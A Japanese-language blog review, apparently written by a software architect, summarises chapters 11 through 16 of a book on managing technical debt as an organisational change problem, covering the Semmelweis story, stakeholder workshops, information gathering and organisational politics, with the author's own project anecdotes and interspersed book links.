Everyone変革の難しさと危険性技術的負債への対処には組織全体の協力が必要だが、変革を起こすことには危険が伴うというのが本章の核心です。著者はマキャベリの「新しい秩序を導入することほど危険で成功が不確かなものはない」という言葉から始め、「安全に」「説得する」「全員を」という三つの重要な視点を提供しています。本章の焦点は、技術的な解決策そのものではなく、その解決策を組織に受け入れてもらうための人間的、社会的側面にあります。セメルワイスという19世紀の医師の悲劇的な事例を通じて、いかに優れたアイデアであっても実装に失敗する可能性があることを示しています。「変化を嫌う人」を動かす:魅力的な提案が受け入れられない4つの理由作者:ロレン・ノードグレン,デイヴィッド・ションタル,船木 謙一(監修)草思社Amazonセメルワイスの教訓19世紀ウィーンの産科医イグナーツ・セメルワイスは、医師が解剖後に手を洗わずに出産を介助することが産褥熱の原因だと突き止めました。塩素化石灰溶液による手洗いを導入すると死亡率が90%減少するという驚異的な成果を上げたにもかかわらず、彼の発見は同僚医師たちに激しく拒絶されました。セメルワイスの理論は当時の主流だった「四体液の不均衡」という病気観と矛盾し、因果関係の説明も不十分でした。さらに医師が「紳士の手」が病気を運ぶという考えに憤慨したことなども障壁となりました。しかし最も致命的だったのは、彼が医学界の重要人物を敵に回してしまったことです。自分の発見を無視する同僚たちを「無責任な殺人者」と非難した結果、彼は精神病院に閉じ込められて死亡するという悲惨な末路をたどりました。この事例から新たなアイデアを導入する際の障壁は必ずしも合理的なものだけではないことがわかります。技術的に優れた解決策であっても、組織の既存パラダイムや人々のプライドと衝突すれば受け入れられないのです。視点の転換セメルワイスの事例から生まれた「セメルワイス反射」は、現在の信念や枠組みに矛盾する新しい証拠を拒絶する認知バイアスを指します。著者は、単にセメルワイスの同僚たちを非合理的だと非難するのではなく、自分をセメルワイスの同僚の立場に置いて考える重要性を強調しています。当時の視点からすれば、セメルワイスの提案した「死体粒子」という因果メカニズムは、科学的進歩ではなく魔術的・迷信的思考への回帰に見えたかもしれません。目に見えない微小なものが人間を殺すという考えは、当時は非合理的に思えたのです。この視点転換から著者は、セメルワイスがより効果的に同僚を説得するために取るべきだった六つの行動を提案しています。同僚を疎外しないこと、より良いコミュニケーションを図ること、「紳士医師」の感受性に配慮すること、支持者の連合を構築すること、好機を待つこと、そして異なるコミュニティに働きかけることです。これらの教訓は技術的負債への取り組みにも直接適用できます。例えば「同僚を疎外しない」というポイントは、現代の事故調査から学んだ「すべての関係者は安全に作業しようとしていた」「当時の視点から見れば全員の行動には理由があった」という前提に基づいています。技術的負債問題でも同様に、関係者を非難するのではなく、彼らがそのような決断をした背景を理解することが重要です。理解してから理解される著者はスティーブン・コヴィーの「7つの習慣」から「理解してから理解される」という原則を引用しています。技術的負債を減らすためには、それを生み出した意思決定プロセスを変える必要があり、関係者がなぜそのような決断をしたのかを深く理解することから始めるべきです。前述の事故調査の原則「当時の視点から見れば全員の行動には理由があった」に則り、技術的負債を生み出した意思決定者が当時のコンテキストで最善と思える選択をしたと考えるべきです。インタビューやワークショップでの時間の大部分は、非難ではなく関係者が直面していた状況と制約を理解することに費やすべきです。著者はさらに「外部性の問題」にも触れています。外部性とは一方の当事者が他方に一方的にコストを押し付けられる状況です。利益を得る側は外部性の継続を望み、それを正当化しようとします。一方でコスト負担側も「誰も自分たちを責められない」「複雑すぎて誰にも理解できない」状態に安住してしまう共依存関係に陥ることもあります。共通理解の構築著者はジェラルド・ワインバーグの「チームのすべてのメンバーが問題の共通理解を持つまで、あらゆる解決の試みは単なる無駄なエネルギーである」という言葉を引用し、技術的負債への取り組みにはワークショップを通じた共通理解の構築が不可欠だと強調しています。共有理解の構築は一人ずつ始めることが推奨されています。まず一対一の面談を通じて各関係者の視点を深く理解し、後のワークショップでの議論の基盤を作ります。個別のインタビューでは、大勢の前では言えない率直な意見も出やすくなります。収集した情報はMiroやLucidchartなどの視覚的コラボレーションツールに記録し、インタビューの過程で徐々に全体像を構築していきます。この共有可視化プロセスが「共有理解」から「共有コミットメント」への移行を助けます。共通理解の構築には「問題基盤情報システム(IBIS)」「対話マッピング」「議論マッピング」などのツールが有効です。これらは利害関係者間の異なる視点を構造化し、建設的な対話を促進します。組織の準備状況への配慮時には組織が変革の準備ができていないこともあります。その場合著者は「変化の段階的理論モデル」を参考に「前熟考段階」に対処することを提案しています。前熟考段階では個人や組織は変化について真剣に考えていません。彼らは現状を守ろうとし、変化のプレッシャーに防衛的になります。ここで強制的な変革を試みるとかえって逆効果となり、「バックファイア効果」（反証的証拠に直面すると既存の信念を強化する傾向）を引き起こす可能性があります。このような状況では大きな変革を強制するのではなく、限定的な戦術的改善にとどめ、将来の介入のための扉を開けておくことが賢明です。セメルワイスの反省点として、彼が同僚を疎外したことで今後の協力可能性を閉ざしてしまったことが挙げられています。安全に説得するためのチェックリスト著者は章の最後に「安全に全員を説得するためのチェックリスト」を提供しています。同僚を疎外していないか、コミュニケーションは明確で促進されているか、全員と関わっているか、個別にステークホルダーと関わっているか、支持者の連合を構築したか、現在は好機か、そして組織が変革の準備ができていない場合も扉を開けておいたかといった点を確認するものです。技術的負債への取り組みは技術的問題というよりも人間の問題です。変革を成功させるためには論理的な正しさだけでなく、感情面への配慮と組織文化の理解が不可欠です。セメルワイスの悲劇から学び、私たちは「安全に全員を説得する」という困難だが不可欠なステップを通じて、技術的負債という厄介な問題に効果的に対処することができるでしょう。技術的負債の問題提起時に非難の言葉を避け、当時の意思決定の文脈を理解し、一対一の対話から始め、視覚的なツールを活用して異なる視点を統合し、組織の準備状況を見極めるというアプローチは、日々の実践に取り入れるべき重要な教訓です。12. A Program to Address Technical Debt技術的負債対策の体系的アプローチ技術的負債に対処する難しさは技術的問題ではないにもかかわらず、責任が高度に技術的な人々に委ねられることが多いという著者の指摘は、問題の本質を見事に捉えています。この章では、技術的負債への対処方法から実際の介入プログラムの構築へと視点を移し、持続可能な取り組みのためのロードマップを提示しています。著者は技術的負債削減プログラムのフレームワークとして6つの主要ステップを提案しています。予備情報収集、問題理解のためのワークショップ、追加情報収集、ソリューション開発のためのワークショップ、パイロットソリューション、そして展開と安定化です。このフレームワークはコード修正などの技術的解決策に直接飛びつく前に、組織の理解と準備状況の評価に時間を割いている点が特徴的です。Figure 12-2 The technical debt reduction program framework より引用私の経験でも技術的アプローチだけでは持続的な改善は達成できないことを実感してきました。コード解析ツールとアーキテクチャ設計を導入したにもかかわらず、数ヶ月後には元の状態に逆戻りしてしまったプロジェクトで、組織の意思決定プロセスと開発文化に焦点を当て直した結果、持続的な改善を実現できました。【ITIL4公認】ITIL 4の基本 図解と実践作者:中 寛之日経BPAmazon準備状況の評価と問題理解予備情報収集ステップでは組織の変化への準備状況を評価することが最重要課題です。組織が準備不足の状態で技術的負債削減プログラムを開始することは逆効果となり、将来の改善機会を損なう可能性があります。また現状に至った理由を理解することで、問題の根本原因に対処できます。問題理解のためのワークショップでは「共有かつ集合的な理解」の構築を目指します。全てのステークホルダーを関与させることで異なる情報を集め、後のプロセスでの協力を確保します。ワークショップではグループを意図的に混合し、異なる分野の人々が代替的な視点を探求する機会を作ることも推奨されています。あるプロジェクトでは運用チームとプロダクト企画チームが同じグループになることで、「リリースの頻度を上げたい」と「システム安定性を確保したい」という相反する要望の矛盾が明らかになり、共通の解決策を模索するきっかけとなりました。解決策の開発と実装ソリューション開発のワークショップでは潜在的な解決策を探索し、最終的にパイロットとして試す解決策を特定します。この段階でも全てのステークホルダーを関与させることが不可欠です。技術チームだけで解決策を設計すると、実装段階で大きな抵抗に直面するリスクがあります。パイロットソリューションの段階では小規模な実験を通して解決策の有効性を検証します。「早期の成功をステークホルダーに報告すること」が特に重要です。技術的負債の削減は通常すぐに目に見える成果を生み出さないため、小さな成功を強調し可視化することが変革を推進する勢いを維持するのに役立ちます。あるクライアントでは技術的負債対策の効果を「開発速度インデックス」という指標で可視化し経営陣に定期報告しました。リファクタリング後の開発速度向上というデータが次のフェーズの予算確保に決定的な役割を果たしました。継続的な改善サイクル著者は技術的負債問題を「一度のサイクルで解決することはできない」と明言しています。技術的負債は「厄介な問題」であり、「解決するというよりむしろ管理する」べきものです。循環するフレームワークを提示し、技術的負債管理が継続的プロセスであることを示しています。一つのサイクルが完了すると問題の性質が変化するため、次のサイクルを開始する必要があります。本章は技術的負債管理を継続的サイクルとして捉える包括的なフレームワークを提示しています。特に重要なのは技術的負債が技術的な問題ではなく変更管理の問題であるという認識です。どんなに優れた技術的解決策も、組織の意思決定プロセスや文化が変わらなければ持続的な改善は実現できません。技術的負債管理は終わりのない旅です。完璧に負債のない状態を目指すのではなく、「管理可能でビジネス価値の創出を妨げない」レベルを維持することが現実的な目標となります。アーキテクトの役割は単に技術的解決策を設計するだけでなく、組織全体がこの永続的な旅を効果的に進められるよう導くことにあります。13. Preliminary Information Gathering遅延満足と組織文化技術的負債への対処は本質的に遅延満足（delayed gratification）の問題であるという洞察は、本章の重要な出発点です。「企業版マシュマロテスト」という概念を通じて、著者は技術的負債管理と組織の忍耐力の関係を描き出しています。「今すぐ一つのマシュマロ」か「後で二つのマシュマロ」かという選択は、開発現場では「今すぐリリースするために技術的負債を増やすか」「時間をかけて適切な実装をし長期的な保守性を確保するか」という決断に直結します。著者が指摘するように、この能力は個人だけでなく組織文化にも依存します。私の経験からも技術的負債管理に成功している組織は、異口同音に「我慢できる文化」を持っています。ある金融テクノロジー企業では経営陣が四半期ごとに「技術的健全性レビュー」を義務付け、短期的な機能開発と長期的な技術投資のバランスを取る仕組みを構築していました。これにより技術チームは「リリース延期」という難しい決断にビジネス側の理解を得やすくなりました。マシュマロテストは単なる比喩ではなく実際の診断ツールとして活用できます。著者が提案する質問を通じて組織の「遅延満足度」を測定し、現実的な改善計画を立てられることは大きな価値があります。ダイアローグ 価値を生み出す組織に変わる対話の技術作者:熊平美香ディスカヴァー・トゥエンティワンAmazon技術的負債の現状把握著者は技術的負債の現状を理解するための5つの質問に焦点を当てています。①技術的負債はどれくらいあるか ②どのように獲得されたか ③組織はどこで痛みを感じているか ④コード関連の技術的負債は何か ⑤アーキテクチャ関連の技術的負債は何か。これらの問いは技術的負債の量だけでなく質や原因まで掘り下げる包括的なアプローチを提供しています。技術的負債の量を測定する手段として著者は「技術的負債レジスター」の活用を提案しています。興味深いのはレジスターの存在だけでなく「更新されているか」も重要視している点です。レジスターが更新されていないという事実自体が組織の技術的負債に対する姿勢を物語っています。著者がシャーロック・ホームズの「吠えなかった犬」の例えを用いて情報の不在も重要なデータだと指摘するのは見事です。私の実務経験からもこの体系的な情報収集アプローチの価値は明らかです。技術的負債の量的測定に加え異なるステークホルダーから多角的に情報を収集することで初めて全体像が見えてきます。ある金融機関では統合的な「技術的負債ヒートマップ」を作成し、組織のどの部分がどのような負債に苦しんでいるかを可視化したことでリソース配分の適正化が実現しました。負債のタイプと消火活動文化著者は技術的負債をコード関連とアーキテクチャ関連に分類して調査することを推奨しています。特に「アーキテクチャ関連の負債が最も高価な技術的負債」であり、多くの場合プロジェクトの初期段階で作られるという指摘は重要です。予算や時間の制約が厳しい場合、アーキテクチャの妥協が行われやすく、長期的なコストが発生します。マイクロサービスアーキテクチャが普及した現代のソフトウェア開発においてもこの問題は顕著です。サービス境界の不適切な設計はシステム全体の複雑性を高め保守コストを増大させます。私の経験では技術的負債の優先順位付けにおいてアーキテクチャとコードの区別は極めて重要です。アーキテクチャの負債は放置すると影響範囲が指数関数的に広がる一方、コードレベルの負債は比較的局所的な影響にとどまります。「消火活動による負債蓄積」のセクションは組織行動の観点から技術的負債の蓄積メカニズムを解説しています。著者は消火活動を「以前に確立された計画や優先事項を無視して問題発生時に反応的修正的なアプローチを適用する管理タイプ」と定義します。消火活動文化の特徴として著者は「技術的負債の長期的影響に関する議論が異端視される」点を指摘しています。現場からの「将来の問題」への懸念が「今の問題を解決できなければ将来なんてない！」という短期的思考に押しつぶされてしまうのです。また「英雄的な消火活動者を過度に称賛する」文化が消火活動を永続化させる危険性も指摘されています。私の経験では「消火活動モード」への転落は予想以上に速く起こります。ある製造業のシステム開発では、最初の遅延発生から2週間でチーム全体が消火活動モードに陥り、テスト活動削減や設計文書の放棄といった悪循環が始まりました。消火活動からの脱却は極めて困難であり、「消火活動モードへの転落を防ぐ」予防策の重要性を痛感しました。効率的な介入点と変革への準備本章の後半で著者は組織の理解に基づく「前進方法の決定」に焦点を当てています。特に「レバレッジポイント」の探索は効率的な技術的負債管理において核心的な考え方です。これは小さな変更で大きな効果をもたらす可能性のある点を指し、効率的な改善の鍵となります。著者は「少なくとも2つの前進方法のアイデアを持って」ワークショップに臨むことを推奨しています。これはエンジニアリング的なアプローチだけでなく組織変革としての準備も必要だという認識を示しています。また「トレードオフの理解」「システムの理解」「潜在的なレバレッジポイントの理解」という段階的なアプローチも実践的です。私のアーキテクト実務においてもレバレッジポイントの特定は技術的負債管理の核心です。あるeコマースシステムでは「商品カタログサービス」がボトルネックとなっていることを特定し、集中的にリファクタリングすることで全体のパフォーマンスが劇的に向上しました。すべての負債に均等にリソースを配分するのではなく「最大の効果をもたらす負債」に集中することが重要です。著者は技術的負債対策プログラムを人々の変化への準備という観点からも考察しています。予備情報収集の段階で「技術的負債が管理された組織ではどのように違うか」を説明することが重要です。より予測可能で迅速なソフトウェア開発というビジョンを共有し、必要な規律や方針変更についても前もって議論しておくべきです。特に興味深いのはソフトウェアシミュレーションモデルの活用提案です。技術的負債の動的側面を探索するためのシミュレーションツールは抽象的な概念を具体的に示す強力な手段となります。個人にモデルを見せて実験させることで、組織の開発プロセスとの類似点や相違点について議論を促進できます。情報収集の重要性本章の核心は適切な情報収集が効果的な技術的負債管理プログラムの基盤だという点です。単なる「悪いコード」の列挙ではなく、組織文化や意思決定プロセスも含めた多角的な調査が不可欠となります。著者は本章の最後に予備情報収集の成果として「質問への回答」「インタビューノート」「初期的な発見事項」が期待されると述べています。ここからさらに組織の技術的負債特性やその原因、そして現在のレベルに関する「感覚」を発展させるべきだと強調しています。これは現代のDevOps文化における「継続的な改善」の概念とも整合します。私の経験では技術的負債管理を一時的なプロジェクトではなく継続的なプロセスとして位置づけることが成功の鍵です。あるSaaS企業では「リファクタリングフライデー」という慣行を導入し、毎週金曜日の半日を技術的負債の返済に充てることで負債が累積する前に対処する文化を構築しました。このような継続的な取り組みを支えるのが本章で説明されている予備情報収集のプロセスです。状況を正確に把握し効果的なレバレッジポイントを特定することで限られたリソースで最大の効果を得ることができます。技術的負債に関する深い理解なしには持続可能な対策は不可能なのです。「測定なくして管理なし」という原則は技術的負債管理にも当てはまります。技術的負債の効果的な管理には正確な現状把握が必須であり、多角的なデータ収集が必要です。組織の遅延満足能力を正直に評価し、技術的負債レジスターを整備し定期的に更新し、コード関連とアーキテクチャ関連の負債を区別して対処し、消火活動文化から脱却するための環境改善を行うというアプローチが有効です。予備情報収集が次の「問題理解ワークショップ」への準備であるという著者の指摘は重要です。情報収集は単独の活動ではなく組織全体の共通理解と行動変革への第一歩なのです。技術的負債管理は技術問題ではなく組織全体の問題だという認識が本章全体を通して強調されています。14. Workshop for Problem Understanding技術的負債への共通理解を構築するワークショップ技術的負債問題を組織全体で理解するためのワークショップは、技術的負債対策プログラムの核心部分です。著者は2日間のワークショップアジェンダを提示し、予備情報収集で得られた知見をもとに組織内の全関係者が技術的負債の本質とその原因を共通理解するためのプロセスを詳細に解説しています。このアジェンダは技術的負債の多層的な性質を反映した構成になっています。1日目は「イントロダクション」「トレードオフ決定の理解」「システム効果の理解」「アンチパターン」をカバーし、2日目は「経済学的視点からの負債」「厄介な問題・社会的複雑性・分断」「総合的な問題理解」へと進みます。この構成は技術的負債「玉ねぎモデル」の層構造と見事に対応しており、単に「コードが汚い」という表面的な理解から、徐々に深層の原因へと参加者の理解を導く流れになっています。私はこのアプローチに強く共感します。これまで多くの組織で技術的負債対策が失敗したのは、問題の本質的な理解なしに表面的な対処に終始したからです。まず、ちゃんと聴く。　コミュニケーションの質が変わる｢聴く｣と｢伝える｣の黄金比作者:櫻井将日本能率協会マネジメントセンターAmazonトレードオフ決定の理解「Understanding Trade-Off Decisions」セクションは特に印象的です。ここでは参加者がアフェクト・ヒューリスティックを用いて意思決定していることへの気づきを促し、技術的負債蓄積の心理学的要因に焦点を当てています。著者はChristopher Hseeの実験を再現する演習から始めることで、参加者の関心を引き理論的な説明へとスムーズに移行しています。この手法はワークショップ設計において非常に効果的です。参加者は自分自身の意思決定傾向を体験的に把握することで、理論の説明により深く共感できるようになります。私が以前ファシリテートしたワークショップでも同様のアプローチを試みました。参加者に複数の選択肢（技術負債を増やして納期を守るか、技術的健全性を保って納期をずらすか）を提示し実際に選択してもらった後で、意思決定パターンを分析したのです。この体験は多くの参加者にとって目からウロコの瞬間となりました。著者はタバコの健康警告メッセージの例も挙げ、技術的負債の問題を理性ではなく感情に訴えかける形で伝える重要性を説明しています。また「ユリシーズ契約」「同時決定vs連続決定」「プリモーテム技法」などの概念も紹介され、参加者がより効果的な意思決定を行うための具体的なツールを提供しています。システム思考とシミュレーション「Understanding Systems Effects」セクションでは、システムの内部構造が外部の影響よりもその行動パターンを決定づけるという重要な洞察を提供しています。著者はITシステムと社会的システムの決定的な違いとして「社会的システムの構成要素は独自の目標を持ち追求できる」点を強調しています。このセクションで紹介されるVensimモデルリーダーを使用した技術的負債シミュレーションモデルは、参加者に動的なシステム挙動を体験的に理解させる強力なツールです。「過剰と崩壊（overshoot and collapse）」のような一見予測困難なシステム行動パターンを視覚化することで、参加者は技術的負債の長期的影響をより直感的に把握できるようになります。私の経験からもこうしたシミュレーションの効果は絶大です。ある金融機関でのプロジェクトでは、技術的負債の蓄積が開発速度に与える影響をシミュレーションモデルで示しました。最初は順調に進むプロジェクトが負債の蓄積とともに徐々に減速し、最終的には機能停止する様子を可視化したことで、経営層が技術的負債対策の重要性を納得したのです。アンチパターンと因果ループ図「Anti-patterns」セクションでは技術的負債を増加させる行動パターンと因果ループ図（CLD）の概念が紹介されています。著者は参加者が自ら「推定トラップ」のCLDを構築する演習を提案しています。この体験型のアプローチは参加者が概念を自分のものとして内在化するのに役立ちます。私のアーキテクト経験でもCLDは複雑な組織的問題を説明するのに非常に有効でした。あるプロジェクトでは「テスト自動化の後回し→手動テスト負荷の増大→テスト自動化に使える時間の減少→さらなる手動テスト依存」という悪循環をCLDで可視化しました。これによりチームは問題の本質が単なる「リソース不足」ではなく「システム構造」にあることを理解し、解決策を見出すことができたのです。経済学的視点と厄介な問題「Technical Debt from an Economics PoV」セクションでは、経済学の概念を用いて技術的負債問題を考察します。著者はHMVでの経験談を通じて「それは私の問題じゃない！」という反応を「外部性」という経済学的概念で説明し、問題の本質が個人の性格ではなくシステム構造にあることを示しています。8つの経済学的問題（プリンシパル・エージェント問題、コモンズの悲劇、外部性、短期主義、小さな決断の専制、忍び寄る正常性、アナーキーの代償、モラルハザード）は技術的負債への新たな視点を提供します。「Wicked Problems, Social Complexity, and Fragmentation」セクションでは技術的負債問題の最も深い層に焦点を当てています。「デザインの二分法」の概念、つまり「あるべき姿」を追求するグループと「できること」に焦点を当てるグループが対立する構図は、多くの組織で見られる現象であり、技術的負債問題においてもビジネス側と技術側のこの対立が根本的な課題となっていることが多いのです。ワークショップの準備と実施「Putting It All Together」セクションでは、著者は「ワークショップが解決策モードに走るのを避ける」ことを強調しています。これは極めて重要なポイントです。問題解決に慣れた技術者はすぐに解決策を提案したがりますが、拙速な解決策は表面的な対処に終わりがちです。問題理解のフェーズで十分に時間をかけることが長期的には効率的なアプローチとなります。後半の「Workshop Preparation」セクションはワークショップの成功に不可欠な準備について詳細なガイダンスを提供しています。ワークショップへの準備に3〜10倍の時間をかけるべきだというアドバイスは現実的で経験に基づいたものだと感じます。また「一人ひとりが最初の30分間に発言する機会を作る」という具体的なテクニックは参加率を高めるための有効な戦略です。第14章のワークショップアプローチの最大の価値は、技術的負債問題を「知識」のレベルから「理解」のレベルへと深める点にあります。参加者は講義を聞くだけでなく、体験的な演習やグループディスカッションを通じて技術的負債の多層的な性質を内在化します。この共通理解が次の「追加情報収集」と「解決策開発」への強固な基盤となるのです。15. Additional Information Gathering and Sensemaking組織の政治的側面の理解第15章で最も印象的だったのは「政治的側面（Political Landscape）の理解」に重点を置いている点です。技術的負債は純粋に技術的な問題ではなく、組織的・政治的な側面を持つという認識は極めて重要です。著者が指摘するように「情報が欠けているように見える場合、実際には隠されていたり偽装されていたりする」ことが多々あります。著者のHMVでのエピソードは非常に示唆に富んでいます。テスターに二画面を与えることが「スクリーン羨望（screen envy）」という理由で拒否された話は、技術的な合理性と組織的な現実の乖離を見事に示しています。Javaデベロッパーに特別感を与えるために二画面を許可し、他のスタッフには認めないという決定は技術的には全く意味がありません。しかし組織の暗黙のヒエラルキーを維持するという政治的観点からは合理的だったのです。私の経験でも同様の状況に遭遇したことがあります。あるプロジェクトではアーキテクチャの重大な欠陥が明らかになったにもかかわらず修正案が拒否され続けました。後になって判明したのはその設計が特定の上級管理職のアイデアだったこと。その人物のプライドを守るために欠陥のあるアーキテクチャが維持されていたのです。こうした人間的要素は純粋に技術的なアプローチでは解決できません。著者の「マインドマップを作成して異なる派閥や彼らの目的、相互関係を把握する」というアドバイスは極めて実用的です。ただし著者が警告するように「共有または誰でもアクセスできる場所に置かないこと」は重要です。こうした政治的分析は誤解を招く恐れがあるため慎重に扱う必要があります。反脆弱性[上]――不確実な世界を生き延びる唯一の考え方作者:ナシーム・ニコラス・タレブダイヤモンド社Amazon情報収集とセンスメイキング「不足情報への対応」セクションでは、組織の政治的側面を理解した上で必要な情報を収集する方法について解説しています。私にとって最も共感できるのは「全ての不足情報を入手することは不可能だと認識すべき」という指摘です。ソフトウェア開発では完璧な情報を持つことは幻想にすぎません。著者の「WMD（大量破壊兵器）の証拠がすべて揃わなくても他国に侵攻するなら、技術的負債についてすべての情報がなくてもワークショップを進めてもよいはず」という皮肉交じりの発言は痛烈です。完璧な情報を待っていては何も始められません。得られる最善の情報で前進する勇気も必要なのです。「意味づけ：全てが意味するものは何か？」セクションは、集めた情報から構造と意味を見出すプロセスを扱っています。著者は様々な技法を紹介していますが、特に興味深いのは非正統的な方法への言及です。「退屈」を創造的なツールとして活用するという発想は新鮮です。問題について考えすぎて退屈になるまで考え、次に完全に忘れて違うことをする。そして睡眠をとった後に戻ってくると新たな洞察が得られるかもしれないというアプローチは、私も経験的に効果を実感しています。センスメイキングプロセスで特に価値があるのは「仮説を検証する」というアプローチです。仮説を立て裏付けるデータを収集するだけでなく、仮説が間違っていることを示す可能性のあるデータも意識的に探すという姿勢は、健全な批判的思考を促します。解決策の形成と検証「潜在的な解決策の形成」セクションでは、技術的負債対策の二つの主要なアプローチ「既存の負債の削減」と「新たな負債の作成回避」のバランスを強調しています。著者は短期的な成果を示すために既存の負債に対処することの重要性を認めつつも、長期的には負債作成プロセスそのものの変革が必要だと述べています。HMVのJukeboxプロジェクトの例はこの原則を完璧に示しています。C#で開発されたシステムをJavaで再実装することで既存の負債は解消されましたが、「IT部門を完全に含めずに戦略的イニシアティブを開始する」という根本原因は解決されなかったのです。結果として新たな負債が作られ続けました。「センスメイキング→潜在的解決策の形成→ステークホルダーフィードバック→リファイン」という反復的なプロセスは特に価値があります。このフィードバックループを通じてステークホルダーの賛同を得つつ解決策を洗練させるアプローチは、変革管理の基本原則に沿っています。私の経験では技術的負債対策プログラムが失敗する最大の理由はこの反復的プロセスの欠如です。多くの場合技術チームが「完璧な」解決策を考案し一方的に導入しようとしますが、ステークホルダーの関与なしでは抵抗に遭い挫折します。小さなフィードバックループを何度も回し、各ステークホルダーが「自分の提案が取り入れられた」と感じる機会を作ることが成功への鍵です。「動的シミュレーションモデル」セクションは、技術的負債の影響を可視化する強力なツールについて言及しています。私の経験では技術的負債の影響を客観的に示すことはステークホルダーの説得において最大の課題の一つです。シミュレーションモデルを通じて負債の蓄積がどのように開発速度の低下や品質問題に結びつくかを視覚的に示すことができれば説得力は格段に高まります。技術を超えた人間の問題この章を通じて最も強調されているのは、技術的負債が単なる技術的問題ではなく「人間の問題」だという点です。著者がジェラルド・ワインバーグの「常に人間の問題である」という言葉を引用しているように、技術的負債の背後には常に人間の決断や人間関係の力学があります。技術偏重のアプローチでは組織の政治的側面や人間の心理を無視してしまうため、効果的な解決は難しくなります。セメルワイスの悲劇的な例が示すように、科学的に正しいソリューションでも人間的な側面を無視すれば拒絶されるリスクがあるのです。私が技術的負債対策プログラムで最も重視するのはこの「人間中心」のアプローチです。技術的に最適な解決策より、組織文化や政治的現実に適合した実行可能な解決策を優先します。また変革の速度も重要です。急激な変化は抵抗を招くため、「ボイルドフロッグ」アプローチとも呼ばれる緩やかな変化が効果的であることが多いです。第15章は技術的負債対策プログラムにおける「問題理解」と「解決策開発」の間の重要なステップを詳細に解説しています。特に重要なのは、技術的負債を単なる技術問題としてではなく、組織的・政治的な問題として捉える視点です。「情報が隠されている可能性」「政治的力学の影響」「完璧な情報の入手不可能性」といった現実を認識したうえでの対応が必要になります。技術的負債対策の成功はアーキテクチャの適切さやコードの質だけでなく、組織の政治的現実への適応力にも大きく依存します。セメルワイスの悲劇を繰り返さないためにも、「それは安全にできるか？」という問いを常に念頭に置き、人間中心のアプローチを心がけることが不可欠です。16. Workshops for Solution Development解決策開発ワークショップの目的と構造第16章は技術的負債対策プログラムの重要な段階である解決策開発ワークショップに焦点を当てています。ワークショップの目的を明確にすることが最も重要であり、著者は「パイロットプロジェクト段階に持ち込める潜在的な解決策をもってワークショップを終えること」という明確な目標を設定しています。著者が提供する1日のワークショップアジェンダは「リキャップと更新」からスタートし、「第一の候補介入策の探索」「第二・第三の介入策の探索」「要約と次のステップ」へと続く論理的な流れになっています。特に「既存の負債への対処 vs 新たな負債の作成回避」というセクションは技術的負債管理の二つの主要アプローチのバランスを考慮する重要性を強調しています。PowerPointスライドデックの活用に関する著者の提案も実用的です。「自分のプレゼンテーションスタイルを反映するように各スライドを修正する」というアドバイスは単なるテンプレートの使用を超えた個人化の重要性を示しています。私が組織でワークショップを実施した経験からも十分な準備が成功の鍵であることを強く実感しています。物語思考　「やりたいこと」が見つからなくて悩む人のキャリア設計術 (幻冬舎単行本)作者:けんすう（古川健介）幻冬舎Amazon前回の理解を振り返る「リキャップと更新」セクションは前回のワークショップの成果と追加調査結果を共有するための重要なステップです。技術的負債の「玉ねぎモデル」の復習は特に重要であり、「技術的負債は技術的問題か？」という問いに対して全員が「No!」と答えるよう促すアプローチは核心的な理解を確認する効果的な方法です。前回のワークショップの結果と追加調査の発見を共有するセクションでは、著者は「ワークショップの方向性を形作る機会」としての側面を強調しています。これは単なる情報共有ではなく、議論を生産的な方向に導くための戦略的なステップです。重要あるいは実りの多い領域を強調し、他の領域にはあまり重点を置かないことでファシリテーターはワークショップの焦点を効果的に調整できます。私の経験でもこのような「方向付け」は極めて重要です。あるプロジェクトでは技術的負債の様々な側面を検討していましたが、全てを同等に扱うと議論が発散してしまいました。そこで特にビジネスインパクトの高いアーキテクチャの整合性に焦点を当てることで、具体的な改善策を効率的に策定することができました。候補介入策の探索と評価「最初の候補介入策の探索」セクションでは、最も有望な技術的負債管理介入策を深掘りします。候補介入策の選択にはドット投票法の使用が推奨されています。各参加者が一定数の投票権を持ち自分が優先したい項目に割り当てるこの手法は、直観的かつ民主的な優先順位付け方法です。ファシリテートされた議論では、介入策の明確な問題/介入ステートメントの作成から始めることが推奨されています。例えば「プロジェクトの過小評価はプロジェクトの遅延につながり技術的負債を生み出す。当組織はプロジェクト見積もりを技術的負債作成の要因でなくなるまで改善する」といった形式です。このような明確なステートメントが議論の焦点を絞り、具体的な行動計画の形成を促進します。解決策アプローチのアイデア生成には「1-2-4-All」とブレインストーミングを組み合わせる方法が提案されています。この手法は個人での思考からペアディスカッション、さらに4人グループでの議論へと段階的に拡大していくアプローチで、多様な視点を集めつつグループダイナミクスを効果的に活用できます。有用なワークショップ技法著者が提案する「有用なワークショップ技法」は実務者にとって貴重なツールキットです。「厄介な質問（Wicked Questions）」は対立する現実を両方とも認める質問を形成する手法です。例えば「技術的負債を減らしながら同時にベロシティをどう維持するか？」といった形式の質問は、矛盾するように見える目標間の創造的な緊張を生み出します。「TRIZ」（発明的問題解決の理論）は特に興味深い手法です。この手法では「最悪の結果を確実にする方法」を特定し、次に「現在行っている活動で最初のリストに似ているもの」を見つけ、最後にそれらの活動を停止する方法を考えます。「技術的負債でいっぱいのITシステムを確実に構築するには？」といった逆説的な問いかけは既存の思考パターンを破壊する効果があります。「チェスタートンのフェンス」は既存のセットアップの理由を完全に理解するまで変更を加えるべきではないという原則です。著者がスイスの製薬会社のシステム移行プロジェクトで経験した教訓（使われていないと思われたインターフェースを削除した結果、ヨーロッパ中の工場が停止した）は非常に印象的です。技術的負債対策においても、既存の「負債」が何らかの重要な目的を果たしている可能性を常に考慮する必要があります。フォローアップと成果の確保著者は「ワークショップの準備」「セッション後のフォローアップ」「アウトプット」といった実践的な側面も詳細に解説しています。特に「Peter Druckerの誤用を借りれば『測定されるものは管理される』。確実に誰かが特定された小さな改善策をフォローアップすることを参加者に知らせなさい」というアドバイスは重要です。ワークショップの成果として著者は「パイロットまたは承認を求めるための1〜3の介入策」「将来のワークショップのための候補介入策リスト」「ワークショップ参加者が実行できる小さな項目のリスト」などの具体的なアウトプットを挙げています。私の経験から最も価値があるのは「ワークショップ参加者が実行できる小さな項目のリスト」です。大規模な組織的変革は時間がかかりますが、小さな改善は即座に実施でき成功体験を積み重ねることができます。第16章で最も重要なメッセージは参加者に「主体性（agency）」を持たせることです。技術的負債は圧倒的で手に負えないように見えることが多く、無力感や諦めを生み出します。しかし著者が提案するワークショップアプローチは参加者が自分たちの裁量でできることに焦点を当て、具体的な行動計画を形成することで主体性を回復させるのです。17. Pilot 